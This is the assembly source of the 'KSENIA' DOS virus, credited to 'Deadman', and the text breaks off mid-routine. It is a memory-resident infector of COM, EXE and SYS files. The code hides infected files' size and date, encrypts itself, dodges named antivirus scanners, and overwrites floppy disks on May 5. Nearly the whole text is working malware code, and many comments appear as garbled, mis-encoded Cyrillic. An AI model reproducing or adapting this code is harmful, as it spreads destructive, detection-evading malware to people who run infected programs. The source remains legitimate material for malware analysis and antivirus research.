    ; comment ^
    ;
    ;              KSENIA Virus Copyright (C) 1998-99 Deadman
    ;            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
    ;        Pre-release Version (0.99 alpha). E-Mail: dman@mail.ru
    ;
    ; TSR/COM/EXE/SYS non-overwriting infector
    ;  Infects on 3Dh/43h/4Bh/56h/6Ch (Open/ChMOD/Exec/Rean/ExtOpen)
    ;  Size stealth on 11h/12h/4Eh/4Fh (Find First/Next FCB/DTA)
    ;  Redirection stealth on 3Fh/42h (Read/LSeek)
    ;  Disinfects the host on 40h (Write)
    ;  Date stealth on 5700h/5701h (Get/Set File time/date)
    ;  Uses Low memory addresses
    ;  Encrypted. Uses XOR/ADD/SUB/NOT/INC/DEC/ROR/ROL/NEG encryptors
    ;  Creates random 16-bit decryption key (value)
    ;  Encrypts the decryption routine via simple XOR
    ;  Doesn't infect files with a current hour stamp
    ;  Doesn't infect files beginning on
    ;      FI (FindVirus)
    ;      SC (McAfee Scan)
    ;      VS (McAfee VShield/Microsoft VSafe)
    ;      TB (ThunderByte shit)
    ;      DR (Doctor Web)
    ;      AV (AntiViral Toolkit Pro)
    ;      F- (F-Protect)
    ;      FP (F-Protect)
    ;      CO (Command Interpreter)
    ;  Disable stealth on running programs (through MCB Owner)
    ;      PKZIP   ÄÄ¿
    ;      RAR       ³
    ;      ARJ       Ã Archivers
    ;      LHA       ³
    ;      ARC     ÄÄÙ
    ;      DEFRAG  ÄÄ¿
    ;      SPEEDISK  ³
    ;      CHKDSK    ³
    ;      BACKUP    Ã To avoid errors
    ;      MSBACKUP  ³
    ;      SCANDISK  ³
    ;      NDD     ÄÄÙ
    ;  Anti-AV routines (Heuristic/Encryption)
    ;      DrWeb 3.24/4.00      - No detection
    ;      AVP/AVPLite 3.0      - No detection
    ;      F-Prot 3.03a         - No detection
    ;      NAV 4.0 (Bloodhound) - No detection
    ;      MSAV                 - No detection
    ;      TbScan 7.04          - No detection, "T" flag set
    ;       TbClean             - Can't emulate ;( ...
    ;  Gets the original int 21h vector uses tunneling method
    ;  Uses SPLICE technology, simple anti-bug trick on windows run
    ;  On May, the 5-th virus will erase every diskette you will insert
    ;  Novell Network shit, depends on system time
    ;
    ; ^

    vsize  equ     eov-ksenia      ; virus size
    msize  equ     eom-ksenia      ; memory needed for virus


           model   tiny
           codeseg
           .386                    ; e?x and dwords enabled :)
    ksenia:
           push    ax bx cx dx si di bp es ds

           cld                     ; take down VSafe
           xor     ax,ax           ; ax  FA01
           mov     ds,ax           ; dx  5945
           mov     ax,0fa01h       ; int 16
           mov     dx,05945h
           pushf                   ; avoid TBScan stealth flag (X)
           call    dword ptr ds:[58h]

           call    extra           ; calculate extra offset
           xor     dx,dx           ; dx=0
           mov     ax,1200h
           pushf
           call    dword ptr ds:[0bch]
           sub     al,0ffh         ; no analysise => al=ff
           sbb     dh,0            ; if yes => dh<>0

           cli                     ; disable interrupts
           mov     si,09h*4        ; si=int 09h vector
           mov     ax,0ffffh
           push    word ptr [si]   ; save offset on stack
           mov     [si],ax         ; break it
           sub     [si],ax         ; breaked?
           pop     word ptr [si]   ; restore offset
           sti
           sbb     dh,0            ; if not => dh<>0

           lea     di,kill_vir+bp  ; store dx+1 nop after kill_vir label
           push    cs              ;
           pop     es
           mov     cx,1
           add     cx,dx
           mov     al,90h
           rep     stosb

    kill_vir:
           nop
           call    crypt           ; decrypt virus in memory
    enc_start:
           cmp     word ptr cs:[original+bp],0ffffh ; started from SYS?
           jne     no_sys

           lea     si,original+bp+6 ; reset interrupt and
           mov     di,6             ; strategy offset
           push    cs cs
           pop     ds es
           movsw
           movsw

           mov     ax,0ba00h       ; move virus body into video memory
           mov     es,ax           ; at BA00:0000
           xor     di,di
           mov     si,bp
           mov     cx,msize
           rep     movsb

           pop     ds es bp di si dx cx bx ax ; restore registers
           push    0ba00h offset sys_return   ; return address
           jmp     word ptr cs:[8]            ; call original routine

    sys_return:
           push    ax bx cx dx si di bp es ds ; staying resident after the driver
                                              ; is installed
           xor     bp,bp                      ; extra offset = 0

           mov     ax,18ddh                   ; already installed?
           int     21h
           cmp     ax,303h                    ; if yes, so return to dos
           je      complete

           les     bx,dword ptr cs:req_head   ; request header
           mov     ax,word ptr es:[bx+0eh]    ; last byte after the driver
           cmp     ax,55000                   ; installation. Is there enough
           ja      complete                   ; memory to append?
           add     word ptr es:[bx+0eh],msize ; increase last byte value
           shr     ax,4                       ; getting new CS
           inc     ax
           add     ax,word ptr es:[bx+10h]
           mov     es,ax
           jmp     move_it

   ; ---- COM/EXE installation ---
    no_sys:
           mov     ax,18ddh
           int     21h
           cmp     ax,303h
           je      complete

           mov     ah,62h          ; psp address
           int     21h
           mov     cs:psp+bp,bx
           add     bx,10h          ; moving virus body over the infected program
           mov     es,bx

    move_it:
           xor     di,di
           mov     si,bp
           mov     cx,msize
           push    cs
           pop     ds
           pushf
           push    es offset zero_bp
           cli
           mov     bp,sp
           sub     bp,7
           mov     word ptr [bp],0a4f3h    ; rep movsb instruction
           mov     byte ptr [bp+2],0cfh    ; iret opcode
           push    ss bp
           retf

    zero_bp:
           sti
           push    cs
           pop     ds
           mov     resthost,0
           mov     ax,psp
           mov     seg0,ax
           mov     seg1,ax
           mov     seg2,ax
           mov     point,offset keyword

           call    cr21z                        ; int 21h vector search
           call    restorehost

           xor     ax,ax           ; ds=0
           mov     ds,ax           ; setting new int 09h vector
           mov     si,09h*4        ;
           lea     di,io9
           movsw
           movsw
           mov     word ptr [si-4],offset int9
           mov     word ptr [si-2],es

           cmp     word ptr cs:original,0ffffh
           je      complete

           mov     es,cs:psp
           mov     ah,4ah
           mov     bx,(msize+100h)/16+2
           int     21h

           mov     si,2ch         ; environment segment
           mov     ds,es:[si]
           xor     ax,ax
           xor     si,si

    get_host:
           cmp     word ptr [si],ax ; looking for the 0000h word
           je      got_host
           inc     si
           jmp     get_host
    got_host:
           lea     dx,[si+4]       ; dx -> infected program's name

           mov     ax,4b00h        ; executing program
           lea     bx,epb
           push    cs
           pop     es
           cli
           xor     si,si
           mov     ss,si
           mov     sp,600h+256
           int     21h
           cli
           xor     ax,ax
           mov     ss,ax
           mov     sp,600h+256
           sti

           mov     ax,cs:psp
           dec     ax
           mov     ds,ax
           xor     si,si
           mov     al,4dh
           xchg    al,byte ptr [si]
           mov     byte ptr [si+100h],al
           mov     word ptr [si+3],0fh
           mov     word ptr [si+103h],msize/16+2
           mov     word ptr [si+101h],8

           mov     ah,4dh          ; exit code in AL
           int     21h
           mov     ah,4ch          ; DOS program terminate
           int     21h


   ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
    complete:
           pop     ds es           ; ¢®ááâ ®¢¨âì á¥£¬¥âë¥
           mov     ax,es           ; à¥£¨áâàë ¨ á®åà ¨âì ¨å § ç¥¨¥ ¢ ax

           lea     si,original+bp            ; si-á®åà ¥®¥  ç «® å®áâ 
           mov     cx,word ptr cs:[si]
           cmp     cx,'MZ'                   ; ®âªã¤  áâ àâ®¢ «¨?
           je      run_exe                   ; 'MZ' 'ZM' -> ¨§ …•…è¨ª 
           cmp     cx,'ZM'                   ; 0ffffh -> ¨§ SYS 
           je      run_exe                   ; ¨ ç¥ ¨§ ‘ŽŒ 
           inc     cx
           jz      run_sys

           mov     di,0100h        ; áâ àâ®¢ «¨ ¨§ ‘ŽŒ ,
           movsw                   ; ¢®ááâ ®¢¨âì  ç «®
           movsb

           pop     bp di si dx cx bx ax
           db      0ebh,1          ; ¤¦ ¬¯   6890h
           mov     sp,6890h        ;   íâ®-nop/push 0100
           db      0,1
           db      0ebh,1          ; ¤¦ ¬¯   C3h
           mov     al,0c3h         ; â®¡¨èœ ret

    run_exe:
           add     ax,010h         ; ¢®ááâ  ¢«¨¢ ¥¬ …•…è¨ª
           mov     dx,cs:[si+14h]  ; áâ à®¥ IP
           mov     cs:_ip+bp,dx
           mov     dx,cs:[si+16h]  ; áâ à®¥ CS
           add     dx,ax           ; + PSPSeg+10h
           mov     cs:_cs+bp,dx

           mov     dx,cs:[si+10h]  ; áâ à®¥ SP
           mov     cs:_sp+bp,dx
           add     ax,cs:[si+0eh]  ; áâ à®¥ SS
           mov     cs:_ss+bp,ax

           pop     bp di si dx cx bx ax

           cli
           db      0bch            ;
    _ss    dw      ?               ; cli
           mov     ss,sp           ; mov sp,ss_value
           db      0bch            ; mov ss,sp
    _sp    dw      ?               ; mov sp,sp_value
           sti                     ; sti

           db      0eah            ; far jump instruction
    _ip    dw      ?
    _cs    dw      ?

    run_sys:
           pop     bp di si dx cx bx ax
           retf

    pushall      macro
                 pushf
                 push    ax bx cx dx si di bp ds es
                 endm

    popall       macro
                 pop     es ds bp di si dx cx bx ax
                 popf
                 endm

    copyright    db      '[KSENIA]',0
                 db      'Version 0.99 alpha',0
                 db      'Copyright (C) ',??date,20h,??time,' by Deadman',0
                 db      'The Global Project devoted to Ksenia Chizhova',0

    nmess        db      'External System Error #05. Connection refused.',0
    endnmess:

    wino32bit    db      ' /d:c',0dh

    stdisable    db      'PKZIP',0
                 db      'RAR',0
                 db      'ARJ',0
                 db      'LHA',0
                 db      'ARC',0
                 db      'DEFRAG',0
                 db      'SPEEDISK',0
                 db      'CHKDSK',0
                 db      'BACKUP',0
                 db      'MSBACKUP',0
                 db      'SCANDISK',0
                 db      'NDD',0
                 db      0ffh

    funcs        db      18h XOR 25h
                 dw      tsrtest
                 db      0eh XOR 25h
                 dw      select
                 db      3dh XOR 25h
                 dw      infect
                 db      43h XOR 25h
                 dw      infect
                 db      4bh XOR 25h
                 dw      infect
                 db      56h XOR 25h
                 dw      infect
                 db      6ch XOR 25h
                 dw      extinfect

                 db      11h XOR 25h
                 dw      fcbstealth
                 db      12h XOR 25h
                 dw      fcbstealth
                 db      4Eh XOR 25h
                 dw      dtastealth
                 db      4Fh XOR 25h
                 dw      dtastealth
                 db      00h XOR 25h
                 dw      terminate
                 db      31h XOR 25h
                 dw      terminate
                 db      4Ch XOR 25h
                 dw      terminate
                 db      32h XOR 25h
                 dw      getdpb

                 db      42h XOR 25h
                 dw      seekstealth
                 db      3fh XOR 25h
                 dw      readstealth
                 db      40h XOR 25h
                 dw      writehandler
                 db      57h XOR 25h
                 dw      datestealth
    endf:

    original     db      0c3h,27 dup (0)

    epb     dw      0h      ;
            dw      80h     ;    €¤à¥á ª®¬¬ ¤®© áâà®ª¨
    seg0    dw      ?       ;
            dw      5ch     ;    €¤à¥á ¯¥à¢®£® FCB
    seg1    dw      ?       ;
            dw      6ch     ;    €¤à¥á ¢â®à®£® FCB
    seg2    dw      ?       ;

    keyword db      25h+80h,1Fh+80h,12h+80h,31h+80h,17h+80h,1Eh+80h
    copy           db '123 4 5 Deadman'
    endcopy:

    smb_pattern    db      10100111b
                   db      10100100b
                   db      11000111b
                   db      10100001b
                   db      10100111b
                   db      00000000b
                   db      00000000b
                   db      01111110b
                   db      10000001b
                   db      01111110b
                   db      00000000b
                   db      00000000b
                   db      00000000b
                   db      00000000b

                   db      11101001b
                   db      10001001b
                   db      11101101b
                   db      10001011b
                   db      11101001b
                   db      00000000b
                   db      00000000b
                   db      01111110b
                   db      10000001b
                   db      01111110b
                   db      00000000b
                   db      00000000b
                   db      00000000b
                   db      00000000b

                   db      11100110b
                   db      01001001b
                   db      01001111b
                   db      01001001b
                   db      11101001b
                   db      00000000b
                   db      00000000b
                   db      01111110b
                   db      10000001b
                   db      01111110b
                   db      00000000b
                   db      00000000b
                   db      00000000b
                   db      00000000b

                   db      00000000b
                   db      00000000b
                   db      00000000b
                   db      00111100b
                   db      01000010b
                   db      10011001b
                   db      10100001b
                   db      10100001b
                   db      10011001b
                   db      01000010b
                   db      00111100b
                   db      00000000b
                   db      00000000b
                   db      00000000b

                   db      00000000b
                   db      00000000b
                   db      11101001b
                   db      10101001b
                   db      10101001b
                   db      10101001b
                   db      11101001b
                   db      11001111b
                   db      10100001b
                   db      10100001b
                   db      10100001b
                   db      11101110b
                   db      00000000b
                   db      00000000b


   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡à ¡®âç¨ª ¯à¥àë¢ ¨ï 21
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    tsr:   pushf
           cmp     cs:resthost,0
           je      usual_work
           popf
           mov     cs:resthost,0
           push    bp ax si ds
           mov     bp,sp
           sub     word ptr [bp+8],2
           lds     si,dword ptr [bp+8]
           mov     ax,cs:keepword
           mov     [si],ax
           call    restorehost
           pop     ds si ax bp
           iret

    usual_work:
           push    ds si ax                ; á®åà ¨âì à¥£¨áâàë
           lds     si,dword ptr cs:io21    ; § £àã§¨âì  ¤à¥á
           mov     ax,word ptr cs:prev2    ; ®¡à ¡®âç¨ª  int 21h
           mov     word ptr [si],ax        ; ¨ ¯®ç¨¨âì ¥£®
           pop     ax
           push    ax

           xchg    al,ah
           xor     al,25h
           xor     si,si           ; ¨é¥¬ ¢ â ¡«¨æ¥ ®¬¥à
    findfunc:
           cmp     al,cs:funcs+si  ; äãªæ¨¨, ª®â®à ï á¥©ç á
           jne     wrongfunc       ; ¢ë§ë¢ ¥âáï
           call    verifymcb       ;  è«¨ - ¯à®¢¥à¨âì mcb

           mov     ax,word ptr cs:funcs+si+1 ; ¢§ïâì á¬¥é¥¨¥
    quit_manager:
           mov     word ptr cs:func_jump,ax
           pop     ax si ds                  ; ®¡à ¡®âç¨ª  ¤«ï íâ®© äãªæ¨¨
           popf                              ; ¢®ááâ ®¢¨âì ¢áïªãî « ¦ã
           mov     cs:func_number,ax
           push    cs:func_jump              ; á®á« âìáï   ®¡à ¡®âç¨ª
           ret

    wrongfunc:
           add     si,3            ; ¡¥à¥¬ á«¥¤ãîéãî äãªæ¨î
           cmp     si,endf-funcs   ; ¨§ â ¡«¨æë
           jb      findfunc        ; ¨ááïª« ?
           lea     ax,exithandler
           jmp     quit_manager

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Infect a file
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    extinfect:
           pushad
           mov     dx,si
           jmp     realinfect

    infect:
           pushad

    realinfect:
           push    ds es           ; á®åà ¨âì à¥£¨áâàë

           cmp     ax,4b00h
           jne     no_novell_check
           call    novell          ; ä ª  ¯ î§¥à

    no_novell_check:
           push    ds              ; á®åà ¨âì eax,ds
           push    0               ; § áããâì ¢ ds âã¤  0
           pop     ds
           mov     si,24h*4
           mov     eax,[si]                    ; á®åà ¨âì 24-© ¢¥ªâ®à
           mov     dword ptr cs:io24,eax       ; ãáâ ®¢¨âì á¢®©
           mov     word ptr [si],offset int24h ; ®ç¥ì à®¡ª¨© ¨
           mov     word ptr [si+2],cs          ; áâ¥á¨â¥«ìë©
           pop     ds

           mov     cx,128          ;   «¨§¨àã¥¬ ¨¬ï ä ©« 
           mov     di,dx           ; ¨é¥¬ ã ¥£® ª®¥æ
    get_end:
           mov     al,[di]
           inc     di
           or      al,al
           loopnz  get_end
           jz      got_end         ; ¨¬¯®â¥â?

    huy:   jmp     noinf

    got_end:
           dec     di
           mov     al,[di]         ; ¢§ïâì ¡ ©â ¨§ áâà®ª¨
           cmp     al,'.'          ;  ç «® à áè¨à¥¨ï?
           je      got_pixel
           cmp     al,'\'          ;  ç «® ª â «®£ ?
           je      huy
           cmp     al,':'          ; ID ¤¨áª ?
           je      huy
           cmp     di,dx           ;  ç «® áâà®ª¨?
           ja      got_end
           jmp     huy

    got_pixel:
           mov     ax,[di+2]       ; ¢§ïâì ¤¢  á¨¬¢®« 
           call    upreg           ; à áè¨à¥¨ï ¨ *Ž„*Ÿ’œ ¨å
           shl     eax,16
           mov     ax,[di]
           call    upreg
           cmp     eax,'SYS.'
           je      good_ext
           cmp     eax,'MOC.'
           je      good_ext
           cmp     eax,'EXE.'
           jne     huy

    good_ext:
           xchg    bp,ax
           call    filenamecheck   ; ¯à®¢¥à¨âì ä ©«
           jc      huy

           mov     ax,4300h        ; ¤®áâ âì  ââà¨¡ãâë ä ©« 
           call    int21
           jc      huy

           mov     si,cx           ; á®åà ¨âì ¨å ¢ si
           mov     ax,4301h        ; ãáâ ®¢¨âì ®à¬ «ìë¥ ones
           xor     cx,cx
           call    int21
           jc      huy

           push    si ds dx        ; á®åà ¨âì ãª § â¥«ì ¨  âà

           mov     ax,3d02h        ; ¯ëâ âìáï ®âªàëâì ä ©«
           call    int21           ; ¤«ï çâ¥¨ï/§ ¯¨á¨
           jc      restoreattr

           xchg    ax,bx           ; ¯®«®¦¨âì hanlde ¢ bx
           push    cs cs           ; ds ¨ es ¯®ª §ë¢ îâ    á
           pop     ds es
           call    handlecheck     ; ¯à®¢¥à¨âì ä ©«   ¯à¥¤¬¥â
           jc      forcedclose     ; ¥¤¨áª®¢®áâ¨

           call    seek2eof        ; á«¨èª®¬ ¡®«ìè®©?
           cmp     dx,10           ;   â® Divide Overflow
           jae     close           ;  ç¥â ¢ë¥¡ë¢ âìáï
           call    seek2bof        ; ®ââïãâì ª®¥æ ®¡à â®

           call    inf?            ; ¯à®¢¥à¨âì, ¡ë« «¨ ® ¨ä¨-
           jc      close           ; æ¨à®¢  ¢¨àãá®¬

           mov     ah,3fh          ; áç¨â âì ¯¥à¢ë¥ 28 ¡ ©â
           mov     cx,28           ; ¢ ds:original
           lea     dx,original
           call    int21
           cmp     cx,ax           ; ¢á¥ ¯à®ç¨â «®áì?
           jne     close
           lea     si,original     ; á¤¥« âì ¢ ¡ãä¥à¥ ª®¯¨î
           lea     di,buffer
           mov     cx,28
           cld
           rep     movsb

           lea     si,original     ; no comments
           lea     di,buffer

           mov     ax,[si]         ; ¢§ïâì ¢ ax ¯¥à¢ë¥ 2 ¡ ©â 
           cmp     bp,'S.'
           je      infect_sys
           cmp     ax,'ZM'         ; â ª «¨ íâ®?
           je      infect_exe
           cmp     ax,'MZ'
           je      infect_exe

           call    cominfect
           jmp     analyse
    infect_exe:
           call    exeinfect
           jmp     analyse
    infect_sys:
           call    sysinfect
    analyse:
           jc      close           ; å®áâ 
           call    writevirus      ; § ¯¨á âì ¢¨àãá

    close: call    correctdate
    forcedclose:
           mov     ah,3eh          ; § ªàëâì ¥£® - çâ®¡ ® §¤®å
           call    int21

    restoreattr:
           pop     dx ds cx        ; ¢®ááâ ®¢¨âì  ââà¨¡ãâë
           mov     ax,4301h
           call    int21

    noinf: push    0               ; ¢®ááâ ®¢¨âì 24-© ¢¥ªâ®à
           pop     ds
           push    eax
           mov     eax,dword ptr cs:io24           ; ¢¥àãâì áâ àë© ¢¥ªâ®à
           mov     dword ptr ds:[24h*4],eax        ; ¯à¥àë¢ ¨ï 24   ¬¥áâ®
           pop     eax

           pop     es ds           ; ¢®ááâ ®¢¨âì à¥£¨áâàë
           popad

           jmp     exithandler     ; ã©â¨..

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Select disk
   ; Disk erasing on holidays
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    select:
           pusha
           cmp     dl,2            ; £¨¡ª®£® ¤¨áª , ¥á«¨ ® ãáâ  ¢«¨¢ ¥âáï
           jae     not_floppy      ; â¥ªãé¨¬ ¨«¨ § â¨à ¥¬ ¤¨áª¥âã

           mov     bp,dx
           mov     ah,2ah          ; ®¯à®á ¤ âë
           call    int21
           cmp     dx,0505h        ; 05.05.XXXX?
           mov     dx,bp
           jne     not_floppy

           inc     dl              ; ã§ ¥¬, áª®«ìª® á¥ªâ®à®¢   ¤¨áª¥
           mov     ah,36h
           call    int21
           inc     ax
           jz      not_floppy
           dec     ax

           mul     dx
           mov     cx,ax
           mov     dx,1            ; á® ¢â®à®£® á¥ªâ®à  (çâ®¡ ¢áïª® ¬®¨â®à®
           dec     cx              ; ¨ £ã£ã)
           mov     ax,bp
           int     26h
           popf

    not_floppy:
           popa
           jmp     exithandler

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; fcb size/date stealth ÄÄ called by 11h/12h
   ; no extension check (see above)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    fcbstealth:
           call    int21                   ; find file!
           pushall                         ; save all 16-bit registers (exc. SP)
           cmp     al,0FFh                 ; no more filez?
           jz      no_stealth              ; nothing to do!
           cmp     cs:stf,0                ; can we stealth?
           jnz     no_stealth              ; we can't stealth
           cmp     cs:drf,0                ; can we stealth?
           jnz     no_stealth              ; we can't stealth

           mov     ah,2Fh                  ; get current DTA address
           call    int21
           mov     al,0FFh                 ; al = FF
           cmp     es:[bx],al              ; FCB is extended?
           jne     no_ext                  ; not extended!
           add     bx,7                    ; else 7 extra bytes
    no_ext:
           lea     si,[bx+14h]             ; si points to file date
           lea     di,[bx+1Dh]             ; di points to file size
           call    sizst                   ; stealth real file size!
           jmp     no_stealth              ; show the false to user!

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; date stealth ÄÄ called by 57h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    datestealth:
           or      al,al
           jnz     set_date
           call    int21
           call    hidestm
           jmp     ireturn

    set_date:
           call    int21
           call    correctdate
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; dta size/date stealth ÄÄ called by 4Eh/4Fh
   ; no extension check (infected.exe could be renamed to fuckup.fun)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    dtastealth:
           call    int21                   ; find file!
           pushall                         ; save all 16-bit registers (exc. SP)
           jc      no_stealth              ; nothing to do?
           cmp     cs:stf,0                ; can we stealth?
           jnz     no_stealth              ; we can't stealth
           mov     ah,2Fh                  ; get current DTA address
           call    int21
           lea     si,[bx+18h]             ; si points to file date
           lea     di,[bx+1Ah]             ; di points to file size
           call    sizst                   ; stealth real file size!
    no_stealth:
           popall                          ; reset all 16-bit registers
           jmp     ireturn                 ; show the false to user!

   ; ----= SIZE STEALTH =----
    sizst: mov     dx,word ptr es:[si]     ; ax = filedate
           call    hidestm                 ; verify and hide stamp
           jnc     no_hide                 ; if no stamp set ;(
           mov     word ptr es:[si],dx     ; save it in DTA
           mov     dx,word ptr es:[di+2]   ; dx:ax = filesize
           mov     ax,word ptr es:[di]
           sub     ax,vsize
           sbb     dx,0
           jc      no_hide
           stosw
           xchg    ax,dx
           stosw
    no_hide:
           ret

   ; ----= DATE CORRECT =----
    correctdate:
           mov     ax,5700h                ; dos function: get file time/date
           call    int21
           call    hidestm                 ; reset file date stamp
           call    inf?                    ; file is already infected?
           jnc     perfectly
           ror     dh,1
           add     dh,100
           rol     dh,1
    perfectly:
           mov     ax,5701h                ; set new, corrected file stamp
           call    int21
           ret

   ; ----= HIDE STAMP =----
    hidestm:
           push    dx                      ; store dx on stack
           shr     dh,1                    ; get stamp in dh
           cmp     dh,100                  ; above 100?
           pop     dx                      ; reset dx
           jb      good_stm
           ror     dh,1                    ; prepare dx
           sub     dh,100                  ; hide real stamp
           rol     dh,1                    ; reset dx
           stc
           ret
    good_stm:
           clc
           ret





   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; allow/disable fcb stealth
   ; virus disables fcb stealth on get dpb (32h) to avoid chkdsk (or other shit)
   ; mistakes
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    terminate:
           mov     cs:drf,0
           jmp     runaway

    getdpb:
           mov     cs:drf,1
    runaway:
           jmp     exithandler

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; lseek stealth
   ; ¨§¡¥£ ¥¬ ¢®§¬®¦®áâ¨ ¯®¯ ¤ ¨ï lseek'    â¥«® ¢¨àãá 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seekstealth:
           cmp     cs:stf,0   ; ¢áïª¨¥ RAR'ë ¡¥£ãâ?
           jnz     nostealth
           call    handlecheck         ; ¤¨áª®¢ë© ä ©«?
           jc      nostealth
           call    inf?                ; ¨ä¨æ¨à®¢ ?
           jnc     nostealth

           cmp     al,2                ; ¯à¨ªàë¢ ¥¬ ¦®¯ã ¢¨àãá ?
           je      hide_eof

           call    int21
           jc      st_ret

           call    seeksave
           call    seekhide
           mov     ax,cs:seek_pos
           mov     dx,cs:seek_pos+2
           clc
    st_ret:
           jmp     ireturn

    hide_eof:
           sub     dx,vsize
           sbb     cx,0

    nostealth:
           jmp     exithandler


   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; read stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    readstealth:
           cmp     cs:stf,0       ; ¢áïª¨¥ RAR'ë ¡¥£ãâ?
           jnz     nostealth
           call    handlecheck         ; ¤¨áª®¢ë© ä ©«?
           jc      nostealth
           call    inf?                ; ¨ä¨æ¨à®¢ ?
           jnc     nostealth

           call    int21               ; ç¨â ¥¬ ç¥ ¯à®áïâ
           jc      st_ret
           pushf                       ; á®åà ¨âì à¥£¨áâàë
           pusha
           mov     bp,dx               ;  ¤à¥á ¡ãä¥à  ªã¤  ç¨â âì
           mov     cs:nrbytes,ax       ; ª®«¨ç¥áâ¢® ¯à®ç¨â ëå ¡ ©â

           cmp     dword ptr cs:seek_pos,28    ; ç¨â îâ § £®«®¢®ª?
           jae     virsubtract
           call    load_original       ; ¢ë¤à âì ®à¨£¨ «ì®¥  ç «® íâ®£® ä ©« 

           lea     si,buffer           ; á¬¥é¥¨¥  ç «  § ¬¥é ¥¬ëå ¡ ©â
           add     si,cs:seek_pos

           mov     cx,cs:nrbytes       ; áç¨â ¥¬ ª®«¨ç¥áâ¢® ¡ ©â ª®â®àë¥  ¬ ã¦®
           add     cx,cs:seek_pos      ; á®áâ¥«á¨âì
           cmp     cx,28
           jbe     overwrite
           mov     cx,28
           sub     cx,cs:seek_pos

    overwrite:
           mov     al,cs:[si]          ; ¯¥à¥®á¨¬ § £®«®¢®ª
           mov     ds:[bp],al
           inc     si
           inc     bp
           loop    overwrite

    virsubtract:
           call    seeksave        ; § ¯®«ï¥¬ ¯¥à¥¬¥ãî "seek_pos" â¥ªãé¨¬
           call    seekhide        ; § ç¥¨¥¬ ¯®«®¦¥¨ï lseek'  ¨ áâ¥«á¨¬
           popa                    ; ¯à¨à é¥¨¥ ¤«¨ë ä ©« 
           popf
           mov     ax,cs:nrbytes   ; ¯à®ç¨â « ax ¡ ©â...
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; «¥ç¨¬ ¢¨àãá®®á¨â¥«ï (ª®£¤  ¢ ¥£® ç¥-¨¡ã¤ì § ¯¨áë¢ îâ)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    writehandler:
           cmp     cs:stf,0   ; ¢áïª¨¥ RAR'ë ¡¥£ãâ?
           jne     nowrite
           call    handlecheck         ; ¤¨áª®¢ë© ä ©«?
           jc      nowrite
           call    inf?                ; ¨ä¨æ¨à®¢ ?
           jnc     nowrite

           call    seeksave            ; á®åà ï¥¬ ãª § â¥«ì § ¯¨á¨

           pusha                       ; ¨§¢à â¨¬áï   à¥£¨áâà ¬¨
           push    ds cs
           pop     ds

           call    load_original       ; ®à¨£¨ «ì®¥  ç «® -> ¢ ¡ãä¥à
           call    seek2bof            ; ãª § â¥«ì -> ¢  ç «® ä ©« 
           mov     ah,40h              ; ¯¨è¥¬ ®à¨£¨ «ì®¥  ç «® ä ©« 
           mov     cx,28               ; 28 ¡ ©â ¨§ ¡ãä¥à 
           lea     dx,buffer
           call    int21
